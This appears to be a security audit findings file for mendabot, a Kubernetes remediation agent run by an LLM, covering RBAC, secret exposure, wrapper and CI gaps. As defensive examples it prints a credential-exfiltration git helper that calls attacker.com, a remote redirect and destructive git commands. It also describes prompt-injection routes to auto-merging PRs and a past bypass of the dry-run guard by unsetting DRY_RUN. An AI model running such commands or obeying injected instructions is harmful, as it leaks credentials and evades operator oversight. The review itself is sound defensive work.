# All Findings

**Review date:** 2026-02-27 (partial code review — no live cluster)
**Total findings:** 14 (13 new, 1 re-classification)
**CRITICAL:** 0 | **HIGH:** 0 Open (4 Fixed, 1 Accepted) | **MEDIUM:** 0 Open (4 Fixed, 1 Accepted, 1 Deferred) | **LOW:** 0 Open (1 Fixed, 1 Deferred) | **INFO:** 0

---

### 2026-02-27-001: Watcher ClusterRole `secrets` — root cause identified; namespace Role now sufficient pending live verification

**Severity:** MEDIUM
**Status:** Accepted (AR-08) — pending live cluster verification before closing
**Phase:** 2
**Attack Vector:** AV-08

#### Description

Pentest finding P-005 (2026-02-24) was classified "Chart-fixed/Upgrade-pending". This was
incorrect. Full git history analysis identifies the precise root cause of the previous
failed removal and confirms the conditions for safe removal are now met in the codebase.

#### Evidence

Commit sequence:

```
86fb076  2026-02-23  Added cache.ByObject restricting Secret informer to AgentNamespace.
                     Added secrets: get (only) to namespace Role.

cd7d53b  2026-02-24  Removed "secrets" from ClusterRole (P-004 hardening sweep).
                     Watcher failed to start within 7 minutes.

a3b5994  2026-02-24  Restored "secrets" to ClusterRole.
                     Reason given: readiness checkers need client.Get on corev1.Secret.

d2d4e4e  2026-02-25  Updated namespace Role secrets verbs: get → get, list, watch.
                     (Connection to P-005 not recognised at the time.)
```

Root cause of the `cd7d53b` failure: at that point the namespace Role had only `secrets:
get`. Controller-runtime requires `list` and `watch` (in addition to `get`) to initialise
and maintain the informer cache. With `cache.ByObject` scoping the informer to
`AgentNamespace`, the permissions must cover that namespace with all three verbs.

Current state (HEAD `e757ae4`): namespace Role has `secrets: get, list, watch`
(`charts/mendabot/templates/role-watcher.yaml:17`). `cache.ByObject` scopes the Secret
informer to `AgentNamespace` (`cmd/watcher/main.go:88-93`). Both conditions for safe
removal of the ClusterRole entry are now met in code.

#### Recommendation

Remove `"secrets"` from `charts/mendabot/templates/clusterrole-watcher.yaml` line 10.
Apply via `helm upgrade` and verify:
1. Watcher pod starts cleanly: `kubectl logs deployment/mendabot | head -20`
2. Watcher reaches Running: `kubectl get pods`
3. Confirm enforcement: `kubectl get secret -n kube-system --as=system:serviceaccount:<ns>:mendabot-watcher` → `Forbidden`

#### Resolution

Accepted as AR-08. ClusterRole entry retained until live cluster verification confirms
safe removal. See `THREAT_MODEL.md` v1.4 AV-08 for full history.

---

### 2026-02-27-002: GitHub App private key exposed as plain-text environment variable in watcher pod

**Severity:** HIGH
**Status:** Fixed — 2026-02-27
**Fix:** Removed `GITHUB_APP_PRIVATE_KEY` env var from `deployment-watcher.yaml`; key now mounted as a read-only projected Secret volume at `/var/run/secrets/mendabot/github-app-private-key/private-key`. `main.go` reads via `os.ReadFile` instead of `os.Getenv`. Key no longer appears in `/proc/1/environ`.
**Phase:** 2 + 6
**Attack Vector:** AV-04

#### Description

When `watcher.prAutoClose=true`, the GitHub App RSA private key is injected into the
watcher Deployment as a plain-text environment variable via `secretKeyRef`. The key is
then read with `os.Getenv("GITHUB_APP_PRIVATE_KEY")` in `main.go`.

#### Evidence

`charts/mendabot/templates/deployment-watcher.yaml:112-116`:
```yaml
{{- if .Values.watcher.prAutoClose }}
- name: GITHUB_APP_PRIVATE_KEY
  valueFrom:
    secretKeyRef:
      name: github-app
      key: private-key
{{- end }}
```

`cmd/watcher/main.go:212`:
```go
privKey, err := jwt.ParseRSAPrivateKeyFromPEM([]byte(os.Getenv("GITHUB_APP_PRIVATE_KEY")))
```

Environment variables are:
- Readable by any process inside the container via `/proc/1/environ`
- Visible in `kubectl get pod -o yaml` (redacted by the API server for non-privileged
  viewers, but accessible to anyone with `get pods` access on the watcher namespace)
- Logged by some frameworks when dumping configuration on startup

The agent init container receives the same key via the same env-var pattern
(`jobbuilder/job.go`). AV-04 documents the init/main isolation for the agent. This
finding is specifically about the **watcher process** receiving the raw private key material
in its environment, which is a broader and longer-lived exposure: the watcher runs
continuously, not for a bounded 15-minute Job window.

#### Exploitability

Requires one of: a process in the watcher pod reading `/proc/1/environ`; an operator with
`get pods` access in the watcher namespace; a sidecar or volume-mount that dumps env vars.
On clusters where the watcher runs in a shared namespace, any co-located workload with pod
exec access can read the key.

#### Impact

The GitHub App private key can mint installation tokens for any repository the App is
installed on. With the key an attacker can push code, open PRs, and access repo contents
indefinitely (until the key is rotated).

#### Recommendation

Mount the private key as a file via a projected `secretVolume` and read it from disk in
`main.go` instead of `os.Getenv`. This removes the key from the process environment and
from `/proc/1/environ`:

```yaml
volumes:
- name: github-app-key
  secret:
    secretName: github-app
    items:
    - key: private-key
      path: private-key.pem
volumeMounts:
- name: github-app-key
  mountPath: /var/run/secrets/mendabot/github-app
  readOnly: true
```

Then in `main.go`:
```go
keyBytes, err := os.ReadFile("/var/run/secrets/mendabot/github-app/private-key.pem")
privKey, err := jwt.ParseRSAPrivateKeyFromPEM(keyBytes)
```

Remove `GITHUB_APP_ID` and `GITHUB_APP_INSTALLATION_ID` env vars similarly if feasible,
or accept they are lower-sensitivity (numeric IDs with no standalone exploit value).

---

### 2026-02-27-003: `git` dry-run wrapper only blocks `push`/`commit`/annotated-tag — destructive subcommands pass through

**Severity:** MEDIUM
**Status:** Fixed — 2026-02-27
**Fix:** `docker/scripts/redact-wrappers/git` now blocks `reset`, `rm`, `clean`, `rebase`, `config --global/--system`, and `remote set-url` in dry-run mode.
**Phase:** 3 + 9
**Attack Vector:** AV-13

#### Description

The `git` wrapper at `docker/scripts/redact-wrappers/git` enforces dry-run mode for
only three subcommands: `push`, `commit`, and annotated/signed `tag`. All other `git`
subcommands pass through unconditionally, including destructive ones.

#### Evidence

`docker/scripts/redact-wrappers/git:43-60`:
```bash
if [ "$_dry_run" = "true" ]; then
    case "${1:-}" in
        push|commit)
            echo "[DRY_RUN] git $* blocked" >&2
            exit 0
            ;;
        tag)
            # Only blocks -a and -s flags; lightweight tags pass through
            ...
    esac
fi
exec /usr/bin/git.real "$@"
```

Subcommands that are **not** blocked in dry-run mode:
- `git reset --hard` / `git reset --mixed` — rewrites working tree state
- `git rm` — removes files from index and working tree
- `git clean -fd` — deletes untracked files (including investigation artefacts)
- `git rebase` / `git rebase -i` — rewrites branch history
- `git config --global credential.helper <script>` — could install a credential exfiltration hook
- `git remote set-url origin <attacker-url>` — redirects future pushes (push is blocked, but the config change persists)
- `git stash drop` / `git stash pop` — modifies working state

#### Exploitability

A hallucinating or injection-manipulated LLM in dry-run mode can still:
1. Call `git clean -fd` to destroy the working tree before the diff is captured by
   `emit_dry_run_report`, causing the investigation report to be empty
2. Call `git config --global credential.helper 'curl https://attacker.com -d'` to
   install a credential exfiltration hook (activated if any subsequent git operation
   reads credentials — however push is blocked, so practical exploitation requires
   a creative path)
3. Call `git reset --hard HEAD~5` to discard staged investigation changes

#### Recommendation

Add the following to the dry-run blocking case in `docker/scripts/redact-wrappers/git`:
```bash
reset|rm|clean|rebase|"remote set-url"|"config --global"|"config --system")
    echo "[DRY_RUN] git $* blocked — write/destructive operations disabled" >&2
    exit 0
    ;;
```
For `git config`, inspect `$2` to block `--global` and `--system` while allowing
local config reads.

---

### 2026-02-27-004: `gh api` not blocked in dry-run mode — arbitrary GitHub REST/GraphQL write calls bypass dry-run enforcement

**Severity:** MEDIUM
**Status:** Fixed — 2026-02-27
**Fix:** `docker/scripts/redact-wrappers/gh` completely rewritten with an allowlist approach. In dry-run mode only explicitly approved read-only operations are permitted (`gh api` GET-only, `gh repo view/list/clone`, `gh pr view/list/checks/diff/review`, `gh issue view/list`, `gh run view/list/watch`, `gh release view/list/download`, `gh workflow view/list`, `gh auth status/token`). All other commands including `gh api -X POST/PUT/PATCH/DELETE` are blocked fail-closed.
**Phase:** 3 + 9
**Attack Vector:** AV-13

#### Description

The `gh` wrapper at `docker/scripts/redact-wrappers/gh` blocks write operations only
for specific named top-level subcommands (`pr`, `issue`, `release`, `gist`, `workflow`).
The `gh api` subcommand, which allows arbitrary raw GitHub REST API and GraphQL calls, is
not in the blocklist and passes through in dry-run mode regardless of HTTP method.

#### Evidence

`docker/scripts/redact-wrappers/gh:42-57`:
```bash
if [ "$_dry_run" = "true" ]; then
    case "${1:-}" in
        pr|issue|release|gist|workflow)
            case "${2:-}" in
                create|edit|close|merge|delete|...)
                    echo "[DRY_RUN] gh $* blocked" >&2
                    exit 0
                    ;;
            esac
            ;;
    esac
fi
```

The following bypass the guard entirely in dry-run:
- `gh api -X POST /repos/owner/repo/pulls -f ...` — creates a PR
- `gh api -X POST /repos/owner/repo/issues -f ...` — creates an issue
- `gh api -X PATCH /repos/owner/repo/pulls/123 -f state=closed` — closes a PR
- `gh api graphql -f query='mutation { ... }'` — GraphQL mutations
- `gh secret set`, `gh variable set`, `gh repo edit`, `gh repo delete`

#### Exploitability

An LLM in dry-run mode that has been manipulated via prompt injection (or is simply
hallucinating) can call `gh api -X POST /repos/owner/repo/pulls ...` and create a
real PR on the production repository. The three-layer sentinel (`/mendabot-cfg/dry-run`,
`/proc/1/environ`, `$DRY_RUN`) guards the named-subcommand case block but has no effect
on the `gh api` path since `api` is not in the `case` statement.

This was the same category of bypass as the `unset DRY_RUN && gh pr create` exploit
confirmed on 2026-02-26 (PR #1263) — a different surface with the same outcome.

#### Recommendation

Replace the current blocklist approach with an allowlist for dry-run mode. Block
everything except explicitly approved read-only patterns. For `gh api` specifically,
block any call that includes `-X POST`, `-X PUT`, `-X PATCH`, `-X DELETE`,
`--method POST/PUT/PATCH/DELETE`, or `graphql` with a mutation. Allow `gh api` with
`-X GET` or no method flag (defaults to GET).

Alternatively — and more robustly — block `gh api` entirely in dry-run, since the
agent's investigation workflow does not depend on raw API calls.

---

### 2026-02-27-005: `agentImage` CRD field has no validation — arbitrary container image can be injected

**Severity:** HIGH
**Status:** Fixed (partial) — 2026-02-27; admission-layer enforcement added — epic29 STORY_06
**Fix:** Added `+kubebuilder:validation:XValidation` immutability rule to `RemediationJobSpec`: `self.agentImage == oldSelf.agentImage`. This prevents post-creation mutation. Image-allowlist validation at the CRD/CEL layer remains deferred. However, the opt-in Kyverno `restrict-agent-image` ClusterPolicy rule (epic29 STORY_06, `agent.kyvernoPolicy.allowedImagePrefix`) provides an admission-layer control that denies agent Jobs whose container image does not start with the configured prefix. When `agent.kyvernoPolicy.enabled: true` and `agent.kyvernoPolicy.allowedImagePrefix` is set, the image-allowlist gap is closed at the Kubernetes API admission level regardless of CRD validation.
**Phase:** 2 + 4
**Attack Vector:** AV-09 (escalated variant)

#### Description

The `agentImage` field in `RemediationJobSpec` has no `pattern`, `enum`, or
`x-kubernetes-validations` constraint in the CRD schema. Any principal with `create`
permission on `remediationjobs.remediation.mendabot.io` can set `agentImage` to an
arbitrary image reference.

#### Evidence

`charts/mendabot/crds/remediation.mendabot.io_remediationjobs.yaml:71-74`:
```yaml
agentImage:
  description: AgentImage is the full image reference for the agent container.
  type: string
```

No `pattern`, `enum`, `minLength`, `maxLength`, or CEL rule constrains this field.

`internal/jobbuilder/job.go:76`:
```go
Image: rjob.Spec.AgentImage,
```
The value is used verbatim in the Job container spec.

Under normal operation, `agentImage` is set by the watcher from `r.Cfg.AgentImage`
(`internal/provider/provider.go:502`), which comes from the operator's config env var.
The threat is a compromised watcher, or any cluster principal that directly creates a
`RemediationJob` (only the watcher SA is intended to do this, but RBAC misconfiguration
or compromise could enable it).

#### Exploitability

1. Attacker gains `create` on `remediationjobs` (requires watcher compromise, ClusterRole
   misconfiguration, or a namespace-admin-level escalation)
2. Creates `RemediationJob` with `spec.agentImage: attacker.registry.io/malicious:latest`
3. Controller dispatches the Job — attacker's image runs with the agent ServiceAccount
   (cluster-wide read + GitHub App credentials in init container)

#### Impact

Full agent ServiceAccount compromise — cluster-wide Secret read, GitHub App token
minting, arbitrary GitOps PR creation.

#### Recommendation

Add a CEL validation rule to the CRD:
```yaml
x-kubernetes-validations:
- rule: "self.agentImage.startsWith('ghcr.io/lenaxia/mendabot-agent:')"
  message: "agentImage must reference the mendabot-agent image on ghcr.io/lenaxia"
```

Also add `+kubebuilder:validation:Pattern` and `+kubebuilder:validation:MaxLength=256`
markers on the `AgentImage` field in `api/v1alpha1/remediationjob_types.go`.

---

### 2026-02-27-006: `agentSA` CRD field has no validation — arbitrary ServiceAccount can be injected

**Severity:** HIGH
**Status:** Fixed (partial) — 2026-02-27
**Fix:** Added `+kubebuilder:validation:XValidation` immutability rule to `RemediationJobSpec`: `self.agentSA == oldSelf.agentSA`. This prevents post-creation mutation. Note: allowlist validation (restricting to `mendabot-agent`/`mendabot-agent-ns`) was not added — that requires a Helm-configurable CEL expression to support custom SA names and is deferred as a follow-on.
**Phase:** 2 + 4
**Attack Vector:** AV-09 (escalated variant)

#### Description

The `agentSA` field in `RemediationJobSpec` has no `pattern`, `enum`, or
`x-kubernetes-validations` constraint. An attacker who can create a `RemediationJob`
can set `agentSA` to any ServiceAccount name, causing the agent Job to run with
a higher-privileged SA than intended.

#### Evidence

`charts/mendabot/crds/remediation.mendabot.io_remediationjobs.yaml:75-77`:
```yaml
agentSA:
  description: AgentSA is the ServiceAccount name for the agent Job.
  type: string
```

`internal/jobbuilder/job.go:322`:
```go
ServiceAccountName: rjob.Spec.AgentSA,
```

Used verbatim. The intended values are `"mendabot-agent"` or `"mendabot-agent-ns"`.

#### Exploitability

Same precondition as finding 2026-02-27-005. With `agentSA` set to `"default"` (or any
SA with broader permissions), the agent Job inherits elevated privileges. In clusters
where the `default` SA has non-trivial RBAC bindings, this is a privilege escalation path.

#### Impact

Privilege escalation via SA substitution. Worst case: agent Job runs with a SA that has
cluster-admin or equivalent permissions.

#### Recommendation

Add a CEL validation rule:
```yaml
x-kubernetes-validations:
- rule: "self.agentSA == 'mendabot-agent' || self.agentSA == 'mendabot-agent-ns'"
  message: "agentSA must be 'mendabot-agent' or 'mendabot-agent-ns'"
```

Or expose the allowed values as a Helm-configured CEL expression so operators with
custom SA names can adapt it. Also add `+kubebuilder:validation:Enum=mendabot-agent;mendabot-agent-ns`
in Go.

---

### 2026-02-27-007: 4 CI workflows use `anomalyco/opencode/github@latest` — unpinned supply chain risk with `contents: write`

**Severity:** HIGH
**Status:** Fixed — 2026-02-27
**Fix:** All four workflows pinned to commit SHA `0cf0294787322664c6d668fa5ab0a9ce26796f78` (tag `github-v1.2.9`).
**Phase:** 8
**Attack Vector:** AV-06 (CI/CD variant)

#### Description

Four GitHub Actions workflows use `anomalyco/opencode/github@latest` without pinning to
a commit SHA. All other third-party actions in the same repository are pinned (e.g.,
`actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5`).

#### Evidence

| Workflow | Line | Permissions |
|----------|------|-------------|
| `ai-comment.yml` | 29 | `contents: write`, `issues: write`, `pull-requests: write`, `id-token: write` |
| `issue-opened.yml` | ~20 | `contents: write`, `pull-requests: write` |
| `pr-review.yml` | ~25 | `contents: write`, `pull-requests: write` |
| `renovate-analysis.yml` | ~80 | `contents: write`, `pull-requests: write` |

Also exposed in scope: `OPENAI_API_KEY`, `OPENAI_API_BASE`.

If `anomalyco/opencode` is compromised (typosquat, account takeover, dependency
confusion), the malicious action runs with write access to the repository on every
triggered event.

#### Recommendation

Resolve the current SHA of the `latest` ref:
```bash
gh api repos/anomalyco/opencode/git/refs/heads/main --jq '.object.sha'
```

Pin all four uses:
```yaml
uses: anomalyco/opencode/github@<sha>  # vX.Y.Z
```

Add to Renovate config to track updates automatically.

---

### 2026-02-27-008: `renovate-analysis.yml` gives an LLM autonomous merge authority — no human gate

**Severity:** HIGH
**Status:** Accepted — single-maintainer project, Renovate trusted as automation
**Phase:** 8
**Attack Vector:** AV-05 (CI variant) + AV-06

#### Description

`renovate-analysis.yml` instructs the `anomalyco/opencode` LLM agent to automatically
merge Renovate dependency PRs if it decides they are "Safe to merge", using `contents:
write` and `pull-requests: write`. There is no human approval step.

#### Evidence

`.github/workflows/renovate-analysis.yml` (prompt excerpt passed to LLM):
```
6. Act on the recommendation:
   - Safe to merge: merge with squash method (github_merge_pull_request)
   - Requires code changes: create branch... open a PR...
   - Needs manual review: post comment only, do NOT merge
```

The LLM makes the merge decision autonomously. This decision can be influenced by:
- Adversarial content in the Renovate PR title, body, or linked release notes
- A compromised `anomalyco/opencode` action (finding 2026-02-27-007)
- A malicious Renovate PR that injects instructions into the LLM context

The workflow also excludes certain packages from auto-merge (controller-runtime, LLM
SDKs, etc.) — but this exclusion is specified as a prompt instruction to the LLM, not
a deterministic code check.

#### Exploitability

A supply-chain attacker publishes a malicious version of any non-excluded Go dependency.
Renovate opens a PR. The LLM reads the (attacker-crafted) release notes, judges it "Safe
to merge", and squash-merges it into `main`. The next CI build incorporates the malicious
dependency.

Alternatively: a prompt-injection payload in the PR description instructs the LLM to
merge regardless of package exclusion rules.

#### Recommendation

Remove the auto-merge capability from `renovate-analysis.yml`. Change the LLM output
mode to "comment only". Implement auto-merge as a separate, deterministic step that
checks specific criteria (no new CVEs from govulncheck, no change to excluded packages,
all CI checks pass) without LLM involvement.

---

### 2026-02-27-009: `emit_dry_run_report` writes unredacted agent output and `git diff` to ConfigMap

**Severity:** MEDIUM
**Status:** Fixed — 2026-02-27
**Fix:** `emit_dry_run_report()` in `docker/scripts/entrypoint-common.sh` now pipes both `investigation-report.txt` and the `git diff` output through the `redact` binary before writing to the ConfigMap. Added a pre-flight check that aborts with a non-zero exit if `redact` is not in PATH, preventing a fallback to unredacted output.
**Phase:** 3 + 9
**Attack Vector:** AV-02

#### Description

The `emit_dry_run_report()` function in `docker/scripts/entrypoint-common.sh` captures
`/workspace/investigation-report.txt` (the agent's written report) and `git diff HEAD`
output from `/workspace/repo`, then writes them directly into a Kubernetes ConfigMap
without passing them through the `redact` binary.

#### Evidence

`docker/scripts/entrypoint-common.sh:152-174`:
```bash
if [ -f /workspace/investigation-report.txt ]; then
    REPORT=$(cat /workspace/investigation-report.txt)
fi
PATCH=$(cd /workspace/repo && git diff HEAD; ...)
kubectl create configmap "$CM_NAME" \
    --from-literal=report="$REPORT" \
    --from-literal=patch="$PATCH"
```

The `investigation-report.txt` file is written by the LLM agent. Tool call outputs
that flow through the PATH-shadowing wrappers are redacted at the point of tool
execution, but the agent may include sensitive content directly in its written text
— e.g., copy-pasting a secret value from `kubectl get secret` output that the wrapper
redacted but the LLM re-stated in prose.

The `git diff HEAD` output reflects changes the agent made to files in `/workspace/repo`.
If the agent modified a file containing credentials (e.g., a Helm values file), the
diff would contain those values verbatim in the ConfigMap and subsequently in
`rjob.status.message`.

#### Exploitability

Requires a dry-run investigation where the agent either: (a) paraphrases a secret value
in its report text, or (b) modifies a credential-bearing file whose diff is captured.
The ConfigMap and status message are readable by any principal with `get configmaps` or
`get remediationjobs` in the `mendabot` namespace.

#### Recommendation

Pipe both values through the `redact` binary before writing to the ConfigMap:
```bash
REPORT=$(cat /workspace/investigation-report.txt | /usr/local/bin/redact)
PATCH=$(cd /workspace/repo && git diff HEAD | /usr/local/bin/redact)
```

---

### 2026-02-27-010: Circuit breaker state is in-memory only — resets to zero on watcher pod restart

**Severity:** MEDIUM
**Status:** Open
**Phase:** 9
**Attack Vector:** AV-01 (self-remediation cascade variant)

#### Description

`internal/circuitbreaker/circuitbreaker.go` stores `lastAllowed time.Time` in a struct
field with no persistence. On watcher pod restart, `lastAllowed` is the zero value and
the cooldown is immediately satisfied.

#### Evidence

`internal/circuitbreaker/circuitbreaker.go:12-35`:
```go
type CircuitBreaker struct {
    cooldown    time.Duration
    mu          sync.Mutex
    lastAllowed time.Time  // zero on restart
}

func (cb *CircuitBreaker) ShouldAllow() (bool, time.Duration) {
    if !cb.lastAllowed.IsZero() {
        elapsed := time.Since(cb.lastAllowed)
        if elapsed < cb.cooldown {
            return false, cb.cooldown - elapsed
        }
    }
    cb.lastAllowed = time.Now()
    return true, 0
}
```

#### Exploitability

Scenario: a self-remediation cascade of depth 1 fires. The circuit breaker trips,
starts its 300-second cooldown. The watcher pod is then killed (OOM, node drain, rolling
update, or deliberate interference) within those 300 seconds. On restart, the cooldown
is gone. The cascade can continue. A cascading loop could fill the cluster with agent
Jobs, each consuming resources (finding 2026-02-27-011) and potentially triggering
further remediations.

#### Recommendation

Persist the circuit breaker state using `RemediationJob` creation timestamps already
present in etcd. On startup, query recent `RemediationJob` objects whose
`metadata.labels["remediation.mendabot.io/chain-depth"]` > 0 and compute
`lastAllowed` from the most recent one's `metadata.creationTimestamp`. This requires
no new Kubernetes objects and is eventually consistent within a single reconcile loop.

---

### 2026-02-27-011: Agent Job containers have no resource limits — unbounded CPU/memory consumption

**Severity:** MEDIUM
**Status:** Fixed — 2026-02-27
**Fix:** `internal/jobbuilder/job.go` now applies `corev1.ResourceRequirements` to all three Job containers (git-token-clone, dry-run-gate, mendabot-agent). Defaults: requests `cpu: 100m, memory: 128Mi`; limits `cpu: 500m, memory: 512Mi`. Configurable via Helm values (`agent.resources.*`) and env vars (`AGENT_CPU_REQUEST`, `AGENT_MEM_REQUEST`, `AGENT_CPU_LIMIT`, `AGENT_MEM_LIMIT`).
**Phase:** 9

#### Description

`internal/jobbuilder/job.go` does not set `resources.requests` or `resources.limits`
on any of the three containers it creates: `init-token` (init container), `dry-run-gate`
(init container, when dry-run), and the main agent container. The watcher Deployment has
resource limits; agent Jobs do not.

#### Evidence

Searching `internal/jobbuilder/job.go` for `resources`, `limits`, `requests` — no matches.

A single agent Job runs: `kubectl`, `helm`, `flux`, `kustomize`, `opencode` (the LLM
client), and shell scripts. `opencode` in particular buffers the entire LLM conversation
context in memory; on long investigations this can exceed 512 MiB.

With `MAX_CONCURRENT_JOBS` defaulting to allow up to 3 concurrent agent Jobs, three
unbounded agents running simultaneously can exhaust node memory and cause OOM kills of
unrelated workloads.

#### Recommendation

Add resource requests and limits to all containers in `internal/jobbuilder/job.go`.
Expose as Helm values for operator configuration:

```go
Resources: corev1.ResourceRequirements{
    Requests: corev1.ResourceList{
        corev1.ResourceCPU:    resource.MustParse(b.cfg.AgentCPURequest),
        corev1.ResourceMemory: resource.MustParse(b.cfg.AgentMemoryRequest),
    },
    Limits: corev1.ResourceList{
        corev1.ResourceCPU:    resource.MustParse(b.cfg.AgentCPULimit),
        corev1.ResourceMemory: resource.MustParse(b.cfg.AgentMemoryLimit),
    },
},
```

Suggested defaults: requests `cpu: 250m, memory: 256Mi`; limits `cpu: 1, memory: 1Gi`.

---

### 2026-02-27-012: `sinkRef.url` has no format validation — unvalidated URL written to status, events, and logs

**Severity:** LOW
**Status:** Fixed — 2026-02-27
**Fix:** Added `// +kubebuilder:validation:Pattern=` regex `^https://github\.com/` to `SinkRef.URL` in `api/v1alpha1/remediationjob_types.go`. CRD regenerated — the `pattern` constraint now enforces GitHub URLs server-side.
**Phase:** 2
**Attack Vector:** AV-12

#### Description

The `SinkRef.URL` field in `RemediationJobStatus` has no `pattern` validation in the CRD
schema. The agent writes a URL back via `kubectl patch`; the watcher logs it and emits
it in Kubernetes Events.

#### Evidence

`charts/mendabot/crds/remediation.mendabot.io_remediationjobs.yaml` — `sinkRef.url`:
```yaml
url:
  description: URL is the URL of the created sink (e.g. PR URL).
  type: string
```

No `pattern` or `format` constraint. A compromised or injection-manipulated agent could
write an arbitrary string as the URL, which then appears in:
- Kubernetes Events (visible to all viewers with `get events`)
- Watcher audit logs (`zap.String("prRef", ...)`)
- `kubectl get remediationjob -o yaml` output

#### Recommendation

Add `pattern: '^https://github\.com/'` to the `url` field in the CRD schema. In the Go
type, add `+kubebuilder:validation:Pattern=^https://github\.com/`.

---

### 2026-02-27-013: `ai-comment.yml` — any authenticated GitHub user can trigger a privileged LLM run via `/ai` comment

**Severity:** HIGH
**Status:** Fixed — 2026-02-27
**Fix:** Added `github.event.comment.author_association` gate to the `if:` condition of the `respond` job. Only `OWNER`, `MEMBER`, and `COLLABORATOR` associations can trigger the workflow. Unauthorized users are silently skipped (no workflow failure noise). All four OpenCode action pins also fixed as part of finding 2026-02-27-007.
**Phase:** 8
**Attack Vector:** AV-06 (CI/CD social engineering variant)

#### Description

`.github/workflows/ai-comment.yml` triggers on `issue_comment` and
`pull_request_review_comment` events whenever the comment body starts with or contains
`/ai`. There is no check on `github.event.comment.author_association`. Any authenticated
GitHub user (including those with no relationship to the repository) can post a comment
on a public issue or PR and trigger a workflow run with:

- `contents: write`
- `issues: write`
- `pull-requests: write`
- `id-token: write`
- `OPENAI_API_KEY` in scope
- `anomalyco/opencode/github@latest` action executing with `GITHUB_TOKEN`

#### Evidence

`.github/workflows/ai-comment.yml`:
```yaml
on:
  issue_comment:
    types: [created]
  pull_request_review_comment:
    types: [created]

jobs:
  respond:
    if: |
      startsWith(github.event.comment.body, '/ai') ||
      contains(github.event.comment.body, ' /ai')
    ...
    permissions:
      id-token: write
      contents: write
      issues: write
      pull-requests: write
```

No `author_association` check exists.

#### Exploitability

1. External actor opens an issue on the repository (public repos allow this by default)
2. Posts a comment containing `/ai <crafted prompt>`
3. The LLM receives the crafted prompt with `contents: write` access to the repo
4. If the LLM follows the prompt, it could commit code, modify issues, or close PRs

This is also a direct amplification of finding 2026-02-27-007: if `@latest` is
compromised, any `/ai` comment from any user triggers the malicious action.

Additionally, each trigger consumes `OPENAI_API_KEY` credits — an external actor can
cause unbounded API cost by posting many `/ai` comments.

#### Recommendation

Add an `author_association` gate before the OpenCode step:

```yaml
jobs:
  respond:
    if: |
      (startsWith(github.event.comment.body, '/ai') ||
       contains(github.event.comment.body, ' /ai')) &&
      contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'),
               github.event.comment.author_association)
```

This restricts triggers to repository owners, org members, and invited collaborators.

---

### 2026-02-27-014: `finding.Details` is never passed through `RedactSecrets` — latent when Details field is populated

**Severity:** LOW
**Status:** Deferred
**Phase:** 3
**Attack Vector:** AV-02

#### Description

`internal/provider/provider.go:497` copies `finding.Details` directly into
`RemediationJobSpec.Finding.Details` without calling `domain.RedactSecrets`. The
`finding.Errors` field is redacted by every native provider before being stored; the
`Details` field has no equivalent treatment.

`domain.DetectInjection` is called on both fields (`provider.go:185, 201`), but
injection detection is not a substitute for redaction.

**Currently latent:** No native provider today sets the `Details` field — it is always
the zero value (`""`). The risk activates if a new provider populates `Details` with
text derived from cluster state.

#### Resolution

Deferred — no native provider sets `Details` today. Must be fixed before any provider
is added or modified to populate the `Details` field. At that point, add:
```go
// In provider.go, before building the RemediationJob spec:
finding.Details = domain.RedactSecrets(domain.StripDelimiters(finding.Details))
```
